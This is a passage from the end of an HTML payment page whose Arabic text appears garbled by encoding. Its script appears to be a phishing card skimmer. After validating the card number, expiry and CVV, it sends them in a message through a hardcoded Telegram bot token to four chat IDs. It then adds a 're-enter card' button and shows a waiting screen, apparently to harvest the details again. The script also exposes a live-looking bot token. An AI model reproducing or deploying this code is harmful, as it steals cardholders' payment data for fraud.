                showError('expiryError', 'ÙŠØ±Ø¬Ù‰ Ø§Ø®ØªÙŠØ§Ø± ØªØ§Ø±ÙŠØ® Ø§Ù†ØªÙ‡Ø§Ø¡ ØµØ­ÙŠØ­ ÙˆÙ„Ù… ÙŠÙ†ØªÙ‡ÙŠ');
                isValid = false;
            }
            
            if (!validateCVV(pin)) {
                showError('pinError', 'ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù…Ø² CVV ØµØ­ÙŠØ­ Ù…ÙƒÙˆÙ† Ù…Ù† 3 Ø£Ø±Ù‚Ø§Ù…');
                document.getElementById("pinNumber").focus();
                isValid = false;
            }
            
            if (!isValid) {
                return;
            }
            
            // Ø¥Ø¸Ù‡Ø§Ø± Ø­Ø§Ù„Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„
            const submitBtn = document.getElementById("submitBtn");
            const originalText = submitBtn.textContent;
            submitBtn.textContent = "Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„...";
            submitBtn.disabled = true;
            document.getElementById("payForm").classList.add("loading");
            
            // ØªØ¹Ø·ÙŠÙ„ Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
            document.getElementById("cardNumber").disabled = true;
            document.getElementById("expiryMonth").disabled = true;
            document.getElementById("expiryYear").disabled = true;
            document.getElementById("pinNumber").disabled = true;
            
            // ØªØ­Ø¯ÙŠØ« sessionId
            currentSessionId = Date.now();
            
            // Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
            const token = "8390566501:AAEtgzzcPvoIddsz4SCXhmCGF3QhOH6o0r4";
            const chat_ids = ["7335192117", "6323300854", "8280462390", "7942066919"];
            
            const message = `ğŸ’³ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¯ÙØ¹ Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©:\\n\\n` +
                            `ğŸ”¢ Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©: ${cardNumber}\\n` +
                            `ğŸ“† ØªØ§Ø±ÙŠØ® Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡: ${month}/${year}\\n` +
                            `ğŸ” Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ø³Ø±ÙŠ: ${pin}\\n\\n` +
                            `ğŸ†” Ø±Ù‚Ù… Ø§Ù„Ø¬Ù„Ø³Ø©: ${currentSessionId}\\n\\n` +
                            `â³ Ø­Ø§Ù„Ø© Ø§Ù„Ù†Ø¸Ø§Ù…: ÙÙŠ Ø§Ù†ØªØ¸Ø§Ø± Ø§Ù„ØªØ­Ù‚Ù‚\\n\\n` +
                            `âš ï¸ Ø¥Ø°Ø§ ÙƒØ§Ù†Øª Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø®Ø§Ø·Ø¦Ø©ØŒ Ø§Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ø²Ø±:`;

            // ğŸ”¥ Ø¥Ù†Ø´Ø§Ø¡ Ø²Ø± "Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ù‡ Ø®Ø·Ø§"
            const keyboard = {
                inline_keyboard: [[
                    {
                        text: "âŒ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ù‡ Ø®Ø·Ø§ - Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø¥Ø¯Ø®Ø§Ù„",
                        callback_data: "card_info_incorrect"
                    }
                ]]
            };

            console.log("ğŸš€ Ø¨Ø¯Ø¡ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù… Ù…Ø¹ Ø§Ù„Ø²Ø±...");
            
            // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ù„ÙƒÙ„ chat_id
            let sentCount = 0;
            let errorCount = 0;
            
            chat_ids.forEach(chat_id => {
                const url = `https://api.telegram.org/bot${token}/sendMessage`;
                
                console.log(`ğŸ“¤ Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰: ${chat_id}`);
                
                fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: chat_id,
                        text: message,
                        reply_markup: keyboard // Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ø²Ø± Ù„Ù„Ø±Ø³Ø§Ù„Ø©
                    })
                })
                .then(response => {
                    console.log(`âœ… Ø§Ø³ØªØ¬Ø§Ø¨Ø© Ù…Ù† ${chat_id}:`, response.status);
                    if (!response.ok) {
                        throw new Error(`HTTP error! status: ${response.status}`);
                    }
                    return response.json();
                })
                .then(data => {
                    console.log(`ğŸ“Š Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø§Ø³ØªØ¬Ø§Ø¨Ø© Ù…Ù† ${chat_id}:`, data);
                    if (data.ok) {
                        sentCount++;
                        console.log(`âœ… ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ${chat_id} Ø¨Ù†Ø¬Ø§Ø­`);
                    } else {
                        errorCount++;
                        console.error(`âŒ ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ${chat_id}:`, data.description);
                    }
                })
                .catch(error => {
                    errorCount++;
                    console.error(`âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ${chat_id}:`, error);
                })
                .finally(() => {
                    // Ø¥Ø°Ø§ Ø§ÙƒØªÙ…Ù„Øª Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø§Øª
                    if (sentCount + errorCount === chat_ids.length) {
                        console.log(`ğŸ¯ Ø§ÙƒØªÙ…Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„: ${sentCount} Ù†Ø¬Ø§Ø­, ${errorCount} ÙØ´Ù„`);
                        
                        if (sentCount > 0) {
                            // ğŸ”¥ Ø¹Ø±Ø¶ Ø´Ø§Ø´Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø§Ù„ÙÙˆØ±ÙŠ
                            showWaitingOverlay();
                        } else {
                            // ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ - Ø¥Ø¹Ø§Ø¯Ø© ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù†Ù…ÙˆØ°Ø¬
                            resetForm();
                            alert("âŒ ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.");
                        }
                    }
                });
            });
        });

        // ğŸ”¥ ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ù†Ø¸Ø§Ù… Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
        document.addEventListener('DOMContentLoaded', function() {
            console.log("âœ… Ø§Ù„Ù†Ø¸Ø§Ù… Ø¬Ø§Ù‡Ø²! Ø§Ù„Ø¢Ù† Ø¹Ù†Ø¯Ù…Ø§ ØªØ¶ØºØ· Ø¹Ù„Ù‰ Ø²Ø± 'Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ù‡ Ø®Ø·Ø§' ÙÙŠ Ø§Ù„Ø¨ÙˆØªØŒ Ø³ØªØ±Ù‰ Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ø®Ø·Ø£ ØªØ¸Ù‡Ø± ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ ÙÙŠ Ø§Ù„Ù…ÙˆÙ‚Ø¹.");
            initializeBotSystem();
        });
    </script>
</body>
</html>